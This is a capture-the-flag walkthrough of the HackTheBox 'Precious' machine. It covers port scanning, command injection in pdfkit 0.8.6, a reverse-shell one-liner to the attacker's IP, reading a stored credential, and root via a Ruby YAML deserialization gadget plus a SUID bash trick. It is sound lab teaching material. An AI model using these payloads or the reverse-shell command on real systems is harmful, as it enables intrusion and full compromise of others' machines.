---
title: Precious (HackTheBox Writeup)
date: 2023-05-19
categories: [Writeups, HTB]
tags: [Linux, Easy, PDFKit, Ruby]
---

![](/assets/img/precious/1.png)

Hi guys! How are you doing? Today we are going to be solving the `Precious` machine, from the platform `HTB`. This machine is pretty easy, so I recommend you to first try to pwn the machine by yourself. Whatever is your decision, let's start!
These are the contents of the machine:

- Enumeration with `nmap`
- `RCE` via exploiting `pdfkit v0.8.6`
- Privilege escalation via a vulnerable function in a `ruby` script

## Enumeration

- - -

As always, we are going to start enumerating the machine with `nmap`:

```zsh
❯ nmap -p- -sS --open --min-rate 5000 -vvv -Pn -n 10.10.11.189 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-19 17:56 CEST
Initiating SYN Stealth Scan at 17:56
Scanning 10.10.11.189 [65535 ports]
Discovered open port 80/tcp on 10.10.11.189
Discovered open port 22/tcp on 10.10.11.189
Completed SYN Stealth Scan at 17:56, 22.31s elapsed (65535 total ports)
Nmap scan report for 10.10.11.189
Host is up, received user-set (0.31s latency).
Scanned at 2023-05-19 17:56:11 CEST for 22s
Not shown: 49825 closed tcp ports (reset), 15708 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 22.49 seconds
           Raw packets sent: 109151 (4.803MB) | Rcvd: 53229 (2.129MB)
```

Ok, with that command we enumerate all the opened ports and we save the evidence into a file called `allPorts`. Now, with our custom function called `extractPorts` we can see only the IP address and the opened ports so we can perform a deeper scan of those. 
Here is the `extractPorts` function:

```bash
❯ which extractPorts
extractPorts () {
	ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')" 
	ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)" 
	echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
	echo -e "\t[*] IP Address: $ip_address" >> extractPorts.tmp
	echo -e "\t[*] Open ports: $ports\n" >> extractPorts.tmp
	echo $ports | tr -d '\n' | xclip -sel clip
	echo -e "[*] Ports copied to clipboard\n" >> extractPorts.tmp
	batcat extractPorts.tmp
	rm extractPorts.tmp
}
```

Now, let's extract the ports from the file:

```zsh
❯ extractPorts allPorts

    [*] Extracting information...

        [*] IP Address: 10.10.11.189
        [*] Open ports: 22,80

    [*] Ports copied to clipboard
```

Nice. Now, we can perform a deeper scan for those ports:

```zsh
❯ nmap -sCV -p22,80 10.10.11.189 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-19 18:01 CEST
Nmap scan report for precious.htb (10.10.11.189)
Host is up (0.31s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 845e13a8e31e20661d235550f63047d2 (RSA)
|   256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA)
|_  256 33053dcd7ab798458239e7ae3c91a658 (ED25519)
80/tcp open  http    nginx 1.18.0
| http-server-header: 
|   nginx/1.18.0
|_  nginx/1.18.0 + Phusion Passenger(R) 6.0.15
|_http-title: Convert Web Page to PDF
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.04 seconds
```

## Shell - ruby

- - -

Perfect! Here we can see the versions of the services running behind those ports (22,80).
These ports are `ssh` and a web server, respectively. Because we don't have credentials for any user, we can access the web and see if there is anything interesting, so let's add `precious.htb` into your `/etc/hosts` file and then take a look at the website:

![](/assets/img/precious/2.png)

We can see that it is asking us for an `url`, so here we could try an `SSRF` attack, but when we do it, it will say that the given URL is invalid. You can see more information about `SSRF` attacks [here](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery) or [here](https://portswigger.net/web-security/ssrf)

![](/assets/img/precious/3.png)

I don't think that the web is blocking `SSRF` attacks, I think it's just that there isn't any other web service. 
We can see that if we set up a python web server and in the URL field we put our IP and a non-existing file, we'll see that our python web server will report a 404 error:

![](/assets/img/precious/4.png)

But in our python web server...

```zsh
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.189 - - [19/May/2023 18:17:18] code 404, message File not found
10.10.11.189 - - [19/May/2023 18:17:18] "GET /testing HTTP/1.1" 404 -
```

Ok, that was pretty obvious. Now, let's access an existing resource, maybe, just input `http://ourip`:

![](/assets/img/precious/5.png)

All right! So this creates us a `pdf` file of my `nmap` directory, in which I have the enumeration evidences. Now, if we download that `pdf` file and we access it with `exiftool`, we can see some interesting things:

```zsh
❯ exiftool document.pdf
ExifTool Version Number         : 12.57
File Name                       : document.pdf
Directory                       : .
File Size                       : 18 kB
File Modification Date/Time     : 2023:05:19 18:22:24+02:00
File Access Date/Time           : 2023:05:19 18:22:24+02:00
File Inode Change Date/Time     : 2023:05:19 18:22:24+02:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 1
Creator                         : Generated by pdfkit v0.8.6
```

Ok, this is quite obvious, because this is an easy machine, there is no rabbit holes. Down in the report, we can see a version of `pdfkit` that seems pretty old.
If we do a little bit of research of that version, we can find that it is vulnerable to `RCE` (Remote Command Execution). I found this information [here](https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795).
Reading this article a few minutes, we can get to the conclusion that the `?name` parameter is the vulnerable one, so let's try that!

![](/assets/img/precious/6.png)

Now, with our python server running, let's hit enter and see what appends:

![](/assets/img/precious/7.png)

NICE!! Now that we have `RCE`, let's access the machine! 
For that, we will use the typical bash oneliner to give us a `reverse shell`:

![](/assets/img/precious/8.png)

> **Note:** The normal command would be `bash -i >& /dev/tcp/10.10.14.39/443 0>&1`, but because this is being executed by a web, we need to `urlencode` it.

Now, check your `netcat` listener and you should get a `reverse shell`:

```bash
❯ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.39] from (UNKNOWN) [10.10.11.189] 45366
bash: cannot set terminal process group (659): Inappropriate ioctl for device
bash: no job control in this shell
ruby@precious:/var/www/pdfapp$ 
```

## Shell - Henry

- - -

This step is **very** easy, the only thing we need to do is to enumerate a little bit the machine. 
If we run `ls -la` we can see an interesting directory, `.bundle`:

```bash
ruby@precious:~$ ls -la
total 28
drwxr-xr-x 4 ruby ruby 4096 May 19 12:53 .
drwxr-xr-x 4 root root 4096 Oct 26  2022 ..
lrwxrwxrwx 1 root root    9 Oct 26  2022 .bash_history -> /dev/null
-rw-r--r-- 1 ruby ruby  220 Mar 27  2022 .bash_logout
-rw-r--r-- 1 ruby ruby 3526 Mar 27  2022 .bashrc
dr-xr-xr-x 2 root ruby 4096 Oct 26  2022 .bundle
drwxr-xr-x 3 ruby ruby 4096 May 19 12:53 .cache
-rw-r--r-- 1 ruby ruby  807 Mar 27  2022 .profile
ruby@precious:~$ 
```

Let's move to that directory and let's check its content:

```zsh
ruby@precious:~$ cd .bundle
ruby@precious:~/.bundle$ ls -la
total 12
dr-xr-xr-x 2 root ruby 4096 Oct 26  2022 .
drwxr-xr-x 4 ruby ruby 4096 May 19 12:53 ..
-r-xr-xr-x 1 root ruby   62 Sep 26  2022 config
ruby@precious:~/.bundle$ cat config
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
ruby@precious:~/.bundle$ 
```

Ok, very easy, so here we can see a user called `henry` with a password. Because this is an easy machine, it's pretty obvious that this is a valid system credential:

```bash
ruby@precious:~/.bundle$ su henry
Password: 
henry@precious:/home/ruby/.bundle$ cd
henry@precious:~$ whoami
henry
henry@precious:~$ cat user.txt
1***************************9
henry@precious:~$ 
```

NICE!! We can read the user's flag :D

## Privilege escalation

- - -

As always, for this step the first thing we need to do is to run `sudo -l` to see what commands we can run as root:

```bash
henry@precious:~$ sudo -l
Matching Defaults entries for henry on precious:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
henry@precious:~$ 
```

Ok, analizing this, we can deduce that we can execute the `/opt/update_dependencies.rb` file as root, so let's see what's going on with that file:

```ruby
# Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

def list_local_gems
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts "Installed version differs from the one specified in file: " + local_name
            else
                puts "Installed version is equals to the one specified in file: " + local_name
            end
        end
    end
end
```

This `ruby` file has a critical vulnerability, specifically in this function:

```ruby
def list_from_file
    YAML.load(File.read("dependencies.yml"))
```

Maybe you wonder "What is this code doing?" Well, if you look a little bit you can notice that this is loading a `dependencies.yml` file, but in the script, the `dependencies.yml` is not an absolute path, so if we create a malicious `dependencies.yml` file, it would be executed as root.
After a few minutes of research, I found [this](https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565#file-ruby_yaml_load_sploit2-yaml) and [this](https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/) resources. 
To exploit this, we will copy the code from the first link, and we will save it in the `/tmp` directory on the victim machine:

```bash
henry@precious:~$ cd /tmp
henry@precious:/tmp$ nano dependencies.yml
henry@precious:/tmp$ cat dependencies.yml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: id
         method_id: :resolve
henry@precious:/tmp$ 
```

Now, we can run the following command to see if we can execute commands as root:

```bash
henry@precious:/tmp$ chmod +x dependencies.yml
henry@precious:/tmp$ sudo /usr/bin/ruby /opt/update_dependencies.rb
sh: 1: reading: not found
uid=0(root) gid=0(root) groups=0(root)
henry@precious:/tmp$
```

PERFECT!! As we can see, in the malicious `.yml` file we've entered `id` in the `git_sest` parameter, and by executing the file as root, we can see that it gives us `uid=0(root)`. This means that we can execute commands as root. 
To privilege escalate from this point is a piece of cake, you only need to change `id` by `chmod u+s /bin/bash`. This command will give the bash `SUID` permissions, so by executing the bash as its owner (root) we will switch automatically to user `root` even though we don't input any password:

```bash
henry@precious:/tmp$ nano dependencies.yml
henry@precious:/tmp$ chmod +x dependencies.yml
henry@precious:/tmp$ sudo /usr/bin/ruby /opt/update_dependencies.rb
sh: 1: reading: not found
henry@precious:/tmp$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
henry@precious:/tmp$ 
```

NICEE!! Here we see that the bash has `SUID` permissions now, so just by executing `bash -p`, we will get as root:

```bash
henry@precious:/tmp$ bash -p
bash-5.1# whoami
root
bash-5.1# cat /root/root.txt
6**************************1
bash-5.1# 
```

PERFECT!! Rooted machine!! 

![](/assets/img/precious/9.png)

## Conclusions

- - -

This machine was **very** easy, so if you weren't able to solve it by yourself, don't worry! Hacking abilities are acquired by pwning and pwning machines. 
If you are starting in this, don't feel bad for using writeups, but, I warn you, **don't use always writeups to pwn the whole challenge, use them only if you are stucked at some point**. Even that, if you already have some knowledge of this field, try to pwn the machine by yourself, I can guarantee you that this is the best way to learn.
Saying that, I hope that this machine helped you to learn something. 
As always, it's me, Ruycr4ft.
Take care!!